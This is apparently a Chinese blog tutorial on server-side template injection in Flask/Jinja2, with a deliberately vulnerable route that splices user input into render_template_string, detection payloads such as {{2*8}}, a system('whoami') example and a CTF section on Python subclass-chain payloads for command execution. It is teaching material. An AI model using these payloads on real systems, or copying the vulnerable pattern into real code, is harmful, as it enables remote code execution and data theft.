+<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>{<!-- -->{content}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
+</code></pre> 
+<p>这里hello.html页面将输出 This is any page.<br> {<!-- -->{}}在Jinja2中作为变量包裹标识符。py代码里面可以给content变量传任意参数。</p> 
+<p>2.8 Flask Request对象<br> 来自客户端网页的数据作为全局请求对象发送到服务器。为了处理请求数据，应该从Flask模块导入。<br> Request对象的重要属性如下所列：</p> 
+<pre><code class="prism language-html">•	Form - 它是一个字典对象，包含表单参数及其值的键和值对。
+•	args - 解析查询字符串的内容，它是问号（？）之后的URL的一部分。
+•	Cookies - 保存Cookie名称和值的字典对象。
+•	files - 与上传文件有关的数据。
+•	method - 当前请求方法。
+</code></pre> 
+<p>在渲染模板时，不需要手动分配，可以直接在模板中使用的模板变量及函数：config、request、url_for()、get_flashed_messages()</p> 
+<h2><a id="_SST_386"></a>第三章 服务器端模板（SST）</h2> 
+<h3><a id="31_SSTwhy_387"></a>3.1 为什么需要服务器端模板（SST)(why)</h3> 
+<p>首先，下面的示例是一个为用户提供的源代码，通过分析下面的示例，来解释HTML与应用程序逻辑之间进行混合的弊端。</p> 
+<p><img src="https://images2.imgbox.com/b7/d8/NgTQ3lm5_o.png" alt="在这里插入图片描述"></p> 
+<p>上述代码，不仅仅包括静态的HTML代码，还包括用户名和密码的输入，以及提交按钮。 当用户登录过这个网站，那么用户名和密码就从cookie中提取，并自动登陆。这样就有一个问题，必须以某种方式将值插入到HTML文件中。<br> 通过一个错误的例子来解决上述问题</p> 
+<p><img src="https://images2.imgbox.com/df/91/tkgHCGz3_o.png" alt="在这里插入图片描述"></p> 
+<p>上述代码有很多问题<br> • 没有对用户的输入进行处理；<br> • HTML代码和PHP代码复杂的混合在一起，非常难以理解；<br> • 部分HTML代码分布在多个函数中；<br> • 尝试修改HTML代码中任何内容时（比如新增css类或修改HTML标签的顺序），会比较麻烦。<br> 上述的代码虽然可以格式化进行优化，但是，在大型的代码库中，要求必须有良好的拓展性，所以即使代码格式良好，也会很快变得难以管理。这就是为什么我们需要模板。</p> 
+<p>总而言之，如果在一个页面中 php(其他代码) 代码与 html 代码混合在一起，在很多时候都会造成不便，用模板引擎可以让 php(其他代码) 代码和 html 代码进行分离。</p> 
+<h3><a id="32_SSTwhat_406"></a>3.2 什么是服务器端模板（SST)（what)</h3> 
+<p>与上面混乱的代码相比，服务器端模板提供了一种更加简单的方法来管理动态生成的HTML代码。最大的优点就是你可以在服务器端动态生成HTML页面，看起来跟静态HTML页面一样。现在我们来看看，当我们使用服务器端模板时，复杂的代码看起来如何。<br> <img src="https://images2.imgbox.com/e7/86/A8IxjtIR_o.png" alt="在这里插入图片描述"></p> 
+<p>上述代码对于前面的代码在形式上有一个很大的改进。然而，这个示例代码仍然是静态的。为了显示正确的信息代替花括号占位符，这样就需要一个模板引擎来替换花括号占位符。后端代码如下下图所示：</p> 
+<p>这段代码的作用非常清楚，首先加载login.tpl模板文件，然后给模板中名称相同的变量赋值（大括号里的变量），然后，调用show（）函数，相应地替换变量内容并输出HTML代码。然而，我们在模板中增加了新的功能，可以向用户展示模板渲染的时间。<br> 3.3 为什么服务器端模板是危险的<br> SST 表面上看起来并没有什么危害，但是如果你仔细研究的话,会发现可以从模板内执行本机函数。这意味着，如果攻击者能够将这样的表达式写入模板文件，他们就可以有效地执行任意函数。但是这个文件不一定非要包含你的模板。这种情况下，模板引擎无论如何都会将文件转换为字符串，以便用它们的结果代替表达式。这也是为什么模板引擎允许你对它们进行传递字符串，而不 用直接传递文件位置。<br> 接下来，可以将其和require()和eval()函数进行比较。require()函数会包含一个文件并执行，eval()函数不是执行文件，而是将字符串当成代码来执行。我们应该知道将未经处理的输入传递给eval()函数是极其危险的。每一本优秀的编程书都会反复的提到这一点。但是当涉及到处理模板引擎时，人们却通常忽略了这一点。所以，有时候，你看到的代码是下面这样的：</p> 
+<pre><code class="prism language-php"><span class="token variable">$templateEngine</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplateEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$templateEngine</span><span class="token operator">-&gt;</span><span class="token function">loadString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;form method = {<!-- -->{method}} action = "'</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&gt;[...]&lt;/form&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$template</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$template</span><span class="token operator">-&gt;</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> 
+<p>这段代码显示，在模板中，有一处输入是用户可控的，这就意味着用户可以执行模板表达式。</p> 
+<p>举个例子，恶意的表达式可能非常简单，比如[[system(‘whoami’)]]，这就会执行系统命令whoami。因此模板注入很容易导致远程代码执行（RCE），就像未经过处理的输入直接传递为eval()函数一样。</p> 
+<h2><a id="_SSTI_428"></a>第四章 服务器模板注入（SSTI）</h2> 
+<h3><a id="41__429"></a>4.1 什么是服务器模板注入</h3> 
+<p>Server-Side Template Injection<br> SST 信任了用户的输入，并且执行这些内容，包括执行本机函数。就像 eval 函数对传入的内容未加任何过滤一样。因此模板注入很容易导致远程代码执行（RCE）、信息泄露等漏洞。<br> 上述描述就是我们所说的服务器端模板注入（SSTI）。这个例子非常明显，而在实际中，漏洞会非常隐蔽，难以发现。比如将许多不同的组件连接在一起传递为模板引擎，但是忽视了其中的某些组件可能包含用户可控的输入。</p> 
+<h3><a id="42__433"></a>4.2 模板注入原理</h3> 
+<p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程，这里我们使用 Python 模版引擎Jinja2作为例子来说明模板注入产生的原理。考虑下面这段代码：</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_ssti</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    person <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>
+        <span class="token string">'secret'</span><span class="token punctuation">:</span> <span class="token string">'7d793037a0760186574b0282f2f435e7'</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        person<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token comment">#获取查询参数name的值</span>
+
+    template <span class="token operator">=</span> <span class="token string">'&lt;h2&gt;Hello {<!-- -->{ person.name }}!&lt;/h2&gt;'</span>
+
+
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">,</span> person<span class="token operator">=</span>person<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>使用Jinja2中的render_template_string模版引擎渲染页面，其中模版含有 {<!-- -->{ person.name }}变量，其模版变量值来自于 GET 请求参数 request.args.get(‘name’)。显然这段代码并没有什么问题，即使你想通过 name 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击：<br> <img src="https://images2.imgbox.com/08/50/kc1Z8WKB_o.png" alt="在这里插入图片描述"></p> 
+<p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_ssti</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    person <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>
+        <span class="token string">'secret'</span><span class="token punctuation">:</span> <span class="token string">'7d793037a0760186574b0282f2f435e7'</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        person<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token comment">#获取查询参数name的值</span>
+
+    template <span class="token operator">=</span> <span class="token string">'&lt;h2&gt;Hello %s!&lt;/h2&gt;'</span> <span class="token operator">%</span> person<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token comment"># 插入到返回值</span>
+
+
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">,</span> person<span class="token operator">=</span>person<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见：</p> 
+<p><img src="https://images2.imgbox.com/c3/56/8CQ2URvR_o.png" alt="在这里插入图片描述"></p> 
+<p>对比上面两种情况，简单的说服务端模板注入的形成终究还是因为服务端相信了用户的输出而造成的（Web安全真谛：永远不要相信用户的输入！）。当然了，第二种情况下，攻击者不仅仅能插入JavaScript脚本，还能针对模板框架进行进一步的攻击，此部分只说明原理，在后面会对攻击利用进行详细说明和演示。</p> 
+<h3><a id="43__500"></a>4.3 模板注入检测</h3> 
+<p>上面已经讲明了模板注入的形成原来，现在就来谈谈对其进行检测和扫描的方法。如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。<br> 借用一下代码：</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_ssti</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    person <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>
+        <span class="token string">'secret'</span><span class="token punctuation">:</span> <span class="token string">'7d793037a0760186574b0282f2f435e7'</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        person<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token comment">#获取查询参数name的值</span>
+
+    template <span class="token operator">=</span> <span class="token string">'&lt;h2&gt;Hello %s!&lt;/h2&gt;'</span> <span class="token operator">%</span> person<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token comment"># 插入到返回值</span>
+
+
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">,</span> person<span class="token operator">=</span>person<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>在 flask模板引擎里， {<!-- -->{ var }} 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 name={<!-- -->{2<em>10}} ，则在服务端拼接的模版内容为：<br> Hello {<!-- -->{2</em>10}}!<br> flask 模板引擎在编译模板的过程中会计算 {<!-- -->{2<em>10}} 中的表达式 2</em>10 ，会将其返回值 20 作为模板变量的值输出，如下图：</p> 
+<p><img src="https://images2.imgbox.com/b0/fe/zccoRasl_o.png" alt="在这里插入图片描述"></p> 
+<p>现在把测试的数据改变一下，插入一些正常字符和Jinja2模板引擎默认的注释符，构造 Payload 为：<br> Humen{# comment #}{<!-- -->{2<em>8}}OK<br> 实际服务端要进行编译的模板就被构造为：<br> Hello Humen{# comment #}{<!-- -->{2</em>8}}OK!<br> 这里简单分析一下，由于 {# comment #} 作为Jinja2模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 {<!-- -->{2*8}} 作为模板变量最终会返回 16 作为其值进行显示，因此前端最终会返回内容 Hello Humen16OK !，如下图：</p> 
+<p><img src="https://images2.imgbox.com/fb/c0/fMkKHXdn_o.png" alt="在这里插入图片描述"></p> 
+<p>通过上面两个简单的示例，就能得到 SSTI 扫描检测的大致流程（这里以 Jinja2 为例）：<br> <img src="https://images2.imgbox.com/1f/3f/its7tw6T_o.png" alt="在这里插入图片描述"></p> 
+<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。<br> 简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p> 
+<h2><a id="_CTF_551"></a>第五章 例子（CTF)</h2> 
+<p>在 CTF 中，最常见的也就是 Jinja2 的 SSTI 漏洞了，过滤不严，构造恶意数据提交达到读取flag 或 getshell 的目的。下面以 Python 为例：<br> Flask SSTI 题的基本思路就是利用 python 中的 魔术方法 找到自己要用的函数。</p> 
+<pre><code class="prism language-cmd">__dict__：保存类实例或对象实例的属性变量键值对字典
+__class__：返回调用的参数类型
+__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
+ __bases__：返回类型列表
+ __subclasses__：返回object的子类
+__init__：类的初始化方法
+ __globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
+</code></pre> 
+<p>首先看一下类的dict属性和类对象的dict属性</p> 
+<pre><code class="prism language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""
+    Class A.
+    """</span>
+
+    a <span class="token operator">=</span> <span class="token number">0</span>
+    b <span class="token operator">=</span> <span class="token number">1</span>
+
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">2</span>
+        self<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">3</span>
+
+    <span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'a normal func.'</span><span class="token punctuation">)</span>
+
+    <span class="token decorator annotation punctuation">@staticmethod</span>
+    <span class="token keyword">def</span> <span class="token function">static_test</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'a static func.'</span><span class="token punctuation">)</span>
+
+    <span class="token decorator annotation punctuation">@classmethod</span>
+    <span class="token keyword">def</span> <span class="token function">class_test</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'a calss func.'</span><span class="token punctuation">)</span>
+
+
+obj <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"类："</span><span class="token punctuation">,</span> A<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"对象："</span><span class="token punctuation">,</span> obj<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span>
+</code></pre> 
+<pre><code class="prism language-python">类： <span class="token punctuation">{<!-- --></span><span class="token string">'__module__'</span><span class="token punctuation">:</span> <span class="token string">'__main__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token string">'\n    Class A.\n    '</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>function A<span class="token punctuation">.</span>__init__ at <span class="token number">0x000002573AD5A1E0</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>function A<span class="token punctuation">.</span>test at <span class="token number">0x000002573AD5AF28</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'static_test'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token builtin">staticmethod</span> <span class="token builtin">object</span> at <span class="token number">0x000002573AD4B780</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'class_test'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token builtin">classmethod</span> <span class="token builtin">object</span> at <span class="token number">0x000002573AD4B7F0</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'__dict__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>attribute <span class="token string">'__dict__'</span> of <span class="token string">'A'</span> objects<span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'__weakref__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>attribute <span class="token string">'__weakref__'</span> of <span class="token string">'A'</span> objects<span class="token operator">&gt;</span><span class="token punctuation">}</span>
+对象： <span class="token punctuation">{<!-- --></span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span>
+</code></pre> 
+<p>由此可见， 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类dict里的<br> 　　对象的dict中存储了一些self.xxx的一些东西<br> base 和 mro 都是用来寻找基类的。<br> from flask import request</p> 
+<pre><code class="prism language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#针对jinjia2/flask为[9]适用</span>
+</code></pre> 
+<pre><code class="prism language-python"><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'werkzeug.local.LocalProxy'</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">&gt;</span>
+</code></pre> 
+<h3><a id="51_payload_629"></a>5.1 构造payload</h3> 
+<p>构造payload的大致思路是：找到父类–&gt;寻找子类(可能存在对文件操作的类file)–&gt;找关于命令执行或者文件操作的模块（os,sys,file,shutil, subprocess,configparser）<br> 也就是通过python的对象的继承来一步步实现文件读取和命令执行的。<br> 1.获取字符串的类对象(获取一个类)：</p> 
+<pre><code class="prism language-python"><span class="token string">'a'</span><span class="token punctuation">.</span>__class__
+<span class="token builtin">str</span>
+</code></pre> 
+<p>2.寻找基类链，找到类</p> 
+<pre><code class="prism language-python"><span class="token string">'a'</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
+<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>3.寻找类的所有子类中可用的引用类</p> 
+<pre><code class="prism language-python"><span class="token string">'a'</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token builtin">type</span><span class="token punctuation">,</span>
+ weakref<span class="token punctuation">,</span>
+ weakcallableproxy<span class="token punctuation">,</span>
+ weakproxy<span class="token punctuation">,</span>
+ <span class="token builtin">int</span><span class="token punctuation">,</span>
+ <span class="token builtin">bytearray</span><span class="token punctuation">,</span>
+ <span class="token builtin">bytes</span><span class="token punctuation">,</span>
+ <span class="token builtin">list</span><span class="token punctuation">,</span>
+ NoneType<span class="token punctuation">,</span>
+ NotImplementedType<span class="token punctuation">,</span>
+ traceback<span class="token punctuation">,</span>
+ <span class="token builtin">super</span><span class="token punctuation">,</span>
+ <span class="token builtin">range</span><span class="token punctuation">,</span>
+ <span class="token builtin">dict</span><span class="token punctuation">,</span>
+ dict_keys<span class="token punctuation">,</span>
+ dict_values<span class="token punctuation">,</span>
+ dict_items<span class="token punctuation">,</span>
+ odict_iterator<span class="token punctuation">,</span>
+ <span class="token builtin">set</span><span class="token punctuation">,</span>
+ <span class="token builtin">str</span><span class="token punctuation">,</span>
+ <span class="token builtin">slice</span><span class="token punctuation">,</span>
+ <span class="token builtin">staticmethod</span><span class="token punctuation">,</span>
+ <span class="token builtin">complex</span><span class="token punctuation">,</span>
+ <span class="token builtin">float</span><span class="token punctuation">,</span>
+ <span class="token builtin">frozenset</span><span class="token punctuation">,</span>
+ <span class="token builtin">property</span><span class="token punctuation">,</span>
+ managedbuffer<span class="token punctuation">,</span>
+ <span class="token builtin">memoryview</span><span class="token punctuation">,</span>
+ <span class="token builtin">tuple</span><span class="token punctuation">,</span>
+ …………………………………
+ __main__<span class="token punctuation">.</span>Python<span class="token punctuation">,</span>
+ __main__<span class="token punctuation">.</span>Python<span class="token punctuation">,</span>
+ __main__<span class="token punctuation">.</span>Python<span class="token punctuation">,</span>
+ __main__<span class="token punctuation">.</span>Python<span class="token punctuation">,</span>
+ __main__<span class="token punctuation">.</span>Python<span class="token punctuation">,</span>
+ __main__<span class="token punctuation">.</span>Python<span class="token punctuation">,</span>
+ __main__<span class="token punctuation">.</span>Python<span class="token punctuation">]</span>
+</code></pre> 
+<p>没找到命令执行或者文件操作的模块<br> 4.利用返回一个复数。</p> 
+<pre><code class="prism language-python"><span class="token string">'a'</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2j</span><span class="token punctuation">)</span>
+</code></pre> 
+<h3><a id="52TWCTF_697"></a>5.2这个题目是TWCTF的题目，源码如下</h3> 
+<pre><code class="prism language-python"><span class="token keyword">import</span> flask
+<span class="token keyword">import</span> os
+
+app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine&gt;'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>
